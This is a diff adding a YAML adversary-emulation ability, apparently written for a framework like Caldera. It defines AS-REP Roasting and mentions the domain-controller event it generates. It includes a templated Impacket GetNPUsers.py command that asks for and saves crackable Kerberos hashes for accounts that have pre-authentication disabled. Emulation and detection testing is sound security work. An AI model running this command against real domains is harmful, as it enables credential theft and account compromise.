@@ -1,0 +1,24 @@
+---
+- id: c1a1e001-0003-4a1a-9a11-000000000003
+  name: AS-REP Roasting via Impacket GetNPUsers
+  description: |
+    Enumerates and requests AS-REP responses for accounts with Kerberos
+    pre-authentication disabled (UF_DONT_REQUIRE_PREAUTH) using Impacket's
+    GetNPUsers.py, capturing crackable AS-REP hashes without needing valid
+    credentials. Generates 4768 (Kerberos authentication ticket requested)
+    events with PreAuthType 0 on the domain controller.
+  tactic: credential-access
+  technique:
+    attack_id: T1558.004
+    name: "Steal or Forge Kerberos Tickets: AS-REP Roasting"
+  platforms:
+    linux:
+      sh:
+        command: |
+          python3 GetNPUsers.py #{domain.name}/ -usersfile #{userlist.path} -dc-ip #{dc.ip} -no-pass -outputfile hashes_asrep.txt
+  requirements: []
+  privilege: User
+  repeatable: true
+  singleton: false
+
+  # Note: no `parsers:` block, same reasoning as Kerberoasting ability.
